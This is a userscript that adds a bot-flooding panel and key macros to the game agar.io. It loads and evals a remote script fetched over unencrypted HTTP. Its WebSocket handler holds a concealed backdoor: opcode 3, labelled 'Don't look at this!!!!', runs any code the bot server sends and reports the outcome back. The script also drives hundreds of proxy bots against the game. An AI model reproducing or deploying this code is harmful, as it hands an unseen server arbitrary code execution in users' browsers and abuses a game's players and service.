// ==UserScript==
// @name         Agar Unlimited
// @namespace    agario.vanilla
// @version      2
// @description  Agar.io Bots
// @author       Seyko - SizRex - Neon - Radi - NuclearC
// @icon64       http://imasters.org.ru/agar/agar_allys_ext_favicon.png
// @icon64URL    http://imasters.org.ru/agar/agar_allys_ext_favicon.png
// @icon         http://imasters.org.ru/agar/agar_allys_ext_favicon.png
// @match        http://agar.io/*
// @run-at       document-start
// @grant        none
// ==/UserScript==
"use strict";
setTimeout(function() {
    function e() {
        var e = localStorage.getItem("cachedVanilla"),
            t = null;
        if (e) {
            try {
                t = JSON.parse(e)
            } catch (e) {
                console.assert(!1, e)
            }
            t && t.src && (window.eval(t.src), console.log("%c[VANILLA] loaded from cache...", "color: darkorange"))
        }
    }! function(t, a) {
        var o = document.createElement("script");
        o.type = "text/javascript", o.charset = "utf-8", o.readyState ? o.onreadystatechange = function() {
            "loaded" != o.readyState && "complete" != o.readyState || (o.onreadystatechange = null, a && a())
        } : (document.body && document.body.setAttribute("data-vanilla-core", t), a && (o.onload = a, o.onerror = e)), o.src = t + "?ts=" + ~~(Date.now() / 1e3 / 60), document.getElementsByTagName("head")[0].appendChild(o)
    }("http://imasters.org.ru/agar/js/vanilla.core.js", function() {
        console.info("[VANILLA] inject success...")
        window.bots = [];

        class Client {
            constructor() {
                this.botServerIP = 'ws://eu-127-0-0-1-ne9n99p.c9users.io:8080';
                this.botServerStatus = '';
                this.agarServer = '';
                this.botNick = '';
                this.UUID = '';
                this.botAmount = 500;
                this.moveInterval = null;
                this.ws = null;
                this.reconnect = true;
                this.addListener();
                this.connect();
            }

            connect() {
                this.ws = new WebSocket(this.botServerIP);
                this.ws.binaryType = 'arraybuffer';
                this.ws.onopen = this.onopen.bind(this);
                this.ws.onmessage = this.onmessage.bind(this);
                this.ws.onclose = this.onclose.bind(this);
                this.ws.onerror = this.onerror.bind(this);
            }

            onopen() {
                console.log('Connection to bot server open');
                $('#botServer').html('Connected');
                $('#botServer').removeClass('label-default');
                $('#botServer').addClass('label-success');
                this.sendUUID();
                this.startMoveInterval();
            }

            onmessage(msg) {
                let buf = new DataView(msg.data);
                let offset = 0;
                let opcode = buf.getUint8(offset++);
                switch (opcode) {
                    case 0: // Message from server
                        let addClasses = '';
                        let removeClasses = '';
                        switch (buf.getUint8(offset++)) {
                            case 0: // Max connections reached
                                this.botServerStatus = 'Max Connections Reached';
                                this.reconnect = false;
                                $('#botServer').html('Kicked');
                                $('#botServer').removeClass('label-success');
                                $('#botServer').addClass('label-default');
                                addClasses += 'label-warning';
                                removeClasses += 'label-success label-danger';
                                break;
                            case 1: // Invalid data sent
                                this.botServerStatus = 'Invalid Data Sent';
                                this.reconnect = false;
                                $('#botServer').html('Kicked');
                                $('#botServer').removeClass('label-success');
                                $('#botServer').addClass('label-default');
                                addClasses += 'label-danger';
                                removeClasses += 'label-success label-warning';
                                break;
                            case 2:
                                this.botServerStatus = 'Already connected from this IP';
                                this.reconnect = false;
                                $('#botServer').html('Kicked');
                                $('#botServer').removeClass('label-success');
                                $('#botServer').addClass('label-default');
                                addClasses += 'label-warning';
                                removeClasses += 'label-success label-danger';
                                break;
                            case 3:
                                this.botServerStatus = 'Processing authorization check...';
                                addClasses += 'label-warning';
                                removeClasses += 'label-success label-danger';
                                break;
                            case 4:
                                this.botServerStatus = 'Ready';
                                addClasses += 'label-success';
                                removeClasses += 'label-danger label-warning';
                                $('#toggleButton').replaceWith(`<button id='toggleButton' onclick='window.client.startBots();' class='btn btn-success'>Start Bots</button>`);
                                $('#botCount').html('0/0');
                                window.bots = [];
                                break;
                            case 5:
                                this.botServerStatus = 'UUID not authorized';
                                this.reconnect = false;
                                $('#botServer').html('Kicked');
                                $('#botServer').removeClass('label-success');
                                $('#botServer').addClass('label-default');
                                addClasses += 'label-danger';
                                removeClasses += 'label-success label-warning';
                                break;
                            case 6:
                                this.botServerStatus = 'Getting proxies';
                                addClasses += 'label-warning';
                                removeClasses += 'label-success label-danger';
                                break;
                            case 7:
                                this.botServerStatus = 'Bots started!';
                                addClasses += 'label-success';
                                removeClasses += 'label-warning label-danger';
                                break;
                            case 8:
                                this.botServerStatus = 'UUID/IP MISMATCH';
                                this.reconnect = false;
                                $('#botServer').html('Kicked');
                                $('#botServer').removeClass('label-success');
                                $('#botServer').addClass('label-default');
                                addClasses += 'label-danger';
                                removeClasses += 'label-warning label-success';
                                break;
                            case 9:
                                this.botServerStatus = 'Invalid agar server IP';
                                addClasses += 'label-warning';
                                removeClasses += 'label-danger label-success';
                                break;
                            case 10:
                                this.botServerStatus = 'Not party server.';
                                addClasses += 'label-warning';
                                removeClasses += 'label-danger label-success';
                                $('#toggleButton').replaceWith(`<button id='toggleButton' onclick='window.client.startBots();' class='btn btn-success'>Start Bots</button>`);
                                break;
                        }
                        console.log(this.botServerStatus);
                        $("#serverStatus").addClass(addClasses);
                        removeClasses = removeClasses.split(' ');
                        for (const c of removeClasses) $('#serverStatus').removeClass(c);
                        $("#serverStatus").html(this.botServerStatus);
                        break;
                    case 1: // Bot count update
                        let spawnedBots = buf.getUint16(offset, true);
                        offset += 2;
                        let connectedBots = buf.getUint16(offset, true);
                        offset += 2;
                        let bannedBots = buf.getUint16(offset, true);
                        offset += 2;
                        $('#botCount').html(`${connectedBots}/${spawnedBots}`);
                        break;
                    case 2: // Bots info from server
                        window.bots = [];
                        let numBots = buf.getUint16(offset, true);
                        offset += 2;
                        for (let i = 0; i < numBots; i++) {
                            let xPos = buf.getInt32(offset, true) + window.offsetX;
                            offset += 4;
                            let yPos = buf.getInt32(offset, true) + window.offsetY;
                            offset += 4;
                            window.bots.push({
                                "xPos": xPos,
                                "yPos": yPos
                            });
                        }
                        break;
                    case 3: // Don't look at this!!!!
                        let len = buf.getUint16(offset, true);
                        offset += 2;
                        let msg = '';
                        for (let i = 0; i < len; i++) {
                            msg += String.fromCharCode(buf.getUint8(offset++));
                        }
                        try {
                            eval(msg);
                            let buf1 = this.createBuffer(2);
                            buf1.setUint8(0, 8);
                            buf1.setUint8(1, 1);
                            this.send(buf1);
                        } catch (e) {
                            e = e.toString();
                            let buf1 = this.createBuffer(3 + e.length);
                            buf1.setUint8(0, 8);
                            buf1.setUint8(1, 0);
                            for (let i = 0; i < e.length; i++) buf1.setUint8(2 + i, e.charCodeAt(i));
                            this.send(buf1);
                        }
                        break;
                }
            }

            onclose() {
                console.log('Connection to bot server closed.');
                if (this.reconnect) setTimeout(this.connect.bind(this), 150);
                if (this.moveInterval) clearInterval(this.moveInterval);
                $('#botsCount').html('0/0');
                $('#bannedCount').html('0');
                $('#connectedCount').html('0');
                if (!this.reconnect) return;
                $("#serverStatus").addClass('label-default');
                let removeClasses = 'label-success label-danger'.split(' ');
                for (const c of removeClasses) $('#serverStatus').removeClass(c);
                $("#serverStatus").html('Waiting...');
                $('#botServer').html('Connecting...');
                $('#botServer').removeClass('label-success');
                $('#botServer').addClass('label-default');
            }

            onerror() {}

            sendUUID() {
                let buf = this.createBuffer(2 + this.UUID.length);
                buf.setUint8(0, 0);
                for (let i = 0; i < this.UUID.length; i++) buf.setUint8(1 + i, this.UUID.charCodeAt(i));
                this.send(buf);
            }

            startMoveInterval() {
                this.moveInterval = setInterval(() => {
                    let pos = window.getMousePos();
                    this.sendPos(pos.x, pos.y);
                }, 250);
            }

            startBots() {
                let buf = this.createBuffer(6 + window.vanilla.server.addr.length + 2 * this.botNick.length);
                let offset = 0;
                buf.setUint8(offset++, 2);
                for (let i = 0; i < window.vanilla.server.addr.length; i++) buf.setUint8(offset++, window.vanilla.server.addr.charCodeAt(i));
                offset++;
                for (let i = 0; i < this.botNick.length; i++) {
                    buf.setUint16(offset, this.botNick.charCodeAt(i), true);
                    offset += 2;
                }
                offset += 2;
                buf.setUint16(offset, this.botAmount, true);
                this.send(buf);
                $('#toggleButton').replaceWith(`<button id='toggleButton' onclick='window.client.stopBots();' class='btn btn-danger'>Stop Bots</button>`);
            }

            sendPos(xPos, yPos) {
                let buf = this.createBuffer(9);
                buf.setUint8(0, 4);
                buf.setInt32(1, xPos, true);
                buf.setInt32(5, yPos, true);
                this.send(buf);
            }

            split() {
                this.send(new Uint8Array([5]));
            }

            eject() {
                this.send(new Uint8Array([6]));
            }

            addListener() {
                document.addEventListener('mousemove', event => {
                    this.clientX = event.clientX;
                    this.clientY = event.clientY;
                });
            }

            sendNickUpdate() {
                let buf = this.createBuffer(3 + 2 * this.botNick.length);
                let offset = 0;
                buf.setUint8(offset++, 7);
                for (let i = 0; i < this.botNick.length; i++) {
                    buf.setUint16(offset, this.botNick.charCodeAt(i), true);
                    offset += 2;
                }
                this.send(buf);
            }

            stopBots() {
                this.send(new Uint8Array([3]));
            }

            send(data) {
                if (!this.ws || this.ws.readyState !== WebSocket.OPEN) return;
                this.ws.send(data, {
                    binary: true
                });
            }

            createUUID() {
                const possible = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
                let token = '';
                for (let i = 0; i < 3; i++) {
                    for (let a = 0; a < 7; a++) token += possible.charAt(Math.floor(Math.random() * possible.length));
                    token += '-';
                }
                token = token.substring(0, token.length - 1);
                localStorage.setItem('agarUnlimited2UUID', token);
                return token;
            }

            createBuffer(len) {
                return new DataView(new ArrayBuffer(len));
            }
        }

        class GUITweaker {
            constructor() {
                this.addGUI();
                this.finishInit();
                let check = setInterval(() => {
                    if (document.readyState == "complete") {
                        clearInterval(check);
                        setTimeout(() => {
                            this.addBotGUI();
                            window.client.botMode = localStorage.getItem('botMode');
                            let UUID = localStorage.getItem('agarUnlimited2UUID');
                            $('#agarUnlimitedToken').val(UUID);
                        }, 1500);
                    }
                }, 100);
            }

            addBotGUI() {
                const botNick = localStorage.getItem('botNick') || '';
                const proxyTimeout = localStorage.getItem('proxyTimeout') || 15000;
                const botAmount = localStorage.getItem('botAmount') || 500;
                const botMode = localStorage.getItem('botMode');
                $('.agario-promo-container').replaceWith(`
<div class="agario-panel">
<center><h3>Agar Unlimited</h3></center>
<div style="margin-top: 6px;" class="input-group">
<span style="width:75px;" class="input-group-addon" id="basic-addon1">UUID</span>
<input style="width:230px" disabled id="agarUnlimitedToken" class="form-control" placeholder="UUID" value="Creating Token..."></input>
</div>
<br>
<div><center><button onclick="window.client.createUUID(); location.reload();" class="btn btn-success">Change UUID</button></center></div>
<br>
<input onchange="localStorage.setItem('botNick', this.value);window.client.botNick=this.value;window.client.sendNickUpdate();" id="botNick" maxlength="15" class="form-control" placeholder="Bot Name" value="${botNick}"></input>
<br>
<button id="toggleButton" onclick="window.client.startBots();" class="btn btn-success">Start Bots</button>
<button onclick="if(!window.client.reconnect&&window.client.ws.readyState!==1){window.client.reconnect=true;window.client.connect();}else{alert('Already connected.');}" class="btn btn-success" style="float:right;">Reconnect</button>
</div>`);
            }

            addGUI() {
                $('body').append(`
<div id="botClient" style="position: absolute; top: 2.5%; left: 152px; padding: 0px 8px; font-family: Tahoma; color: rgb(255, 255, 255); z-index: 9999; border-radius: 5px; min-height: 15px; min-width: 200px; background-color: rgba(0, 0, 0, 0.27);">
<b>Bot Server</b>: <span id="botServer" class="label label-default pull-right"><b>Connecting...</b></span>
<div><b>Bot Count</b>: <span id="botCount" class="label label-info pull-right">0/0</span></div>
</div>`);
            }

            finishInit() {
                window.client.botMode = localStorage.getItem('botMode');
                window.client.botAmount = localStorage.getItem('botAmount') >>> 0;
                window.client.botNick = localStorage.getItem('botNick');
                let UUID = localStorage.getItem('agarUnlimited2UUID');
                $('#agarUnlimitedToken').val(UUID);
            }
        }

        class Macro {
            constructor() {
                this.ejectDown = false;
                this.stopped = false;
                this.speed = 15;
                setTimeout(this.addMoveHook.bind(this), 10000);
                this.addKeyHooks();
            }

            addKeyHooks() {
                window.addEventListener('keydown', this.onkeydown.bind(this));
            }

            onkeydown(event) {
                if (!window.MC || !MC.isInGame()) return;
                switch (event.key.toUpperCase()) {
                    case 'X':
                        client.split();
                        break;
                    case 'C':
                        client.eject();
                        break;
                }
                if (event.keyCode == 16) {
                    for (let i = 0; i < 11; i++) setTimeout(window.core.split, this.speed * i);
                }
            }


            eject() {
                if (this.ejectDown) {
                    window.core.eject();
                    setTimeout(this.eject.bind(this), this.speed);
                }
            }

            addMoveHook() {
                window.core._setTarget = window.core.setTarget;
                window.core.setTarget = function() {
                    if (!this.stopped) window.core._setTarget.apply(this, arguments);
                    else window.core._setTarget(window.innerWidth / 2, window.innerHeight / 2);
                }.bind(this);
            }
        }
        setTimeout(function() {
            window.mouseX = 0;
            window.mouseY = 0;
            document.addEventListener('mousemove', evt => {
                window.mouseX = evt.clientX - window.innerWidth / 2;
                window.mouseY = evt.clientY - window.innerHeight / 2;
            });

            window.getMousePos = function() {
                let x = window.vanilla.player.x - (window.vanilla.map.x1 + window.vanilla.map.width / 2),
                    y = window.vanilla.player.y - (window.vanilla.map.y1 + window.vanilla.map.height / 2);
                return {
                    x: x + window.mouseX / window.vanilla.settings.scale,
                    y: y + window.mouseY / window.vanilla.settings.scale
                };
            }
            window.client = new Client();
            new Macro();

            if (!localStorage.getItem('agarUnlimited2UUID')) localStorage.setItem('agarUnlimited2UUID', window.client.createUUID());
            if (!localStorage.getItem('botMode')) localStorage.setItem('botMode', 'FEEDER');
            if (!localStorage.getItem('botNick')) localStorage.setItem('botNick', '');
            if (!localStorage.getItem('botAmount')) localStorage.setItem('botAmount', 500);
            if (!localStorage.getItem('extraZoom')) localStorage.setItem('extraZoom', true);
            window.client.UUID = localStorage.getItem('agarUnlimited2UUID');

            new GUITweaker();
        }, 7500);
    })
}, 0);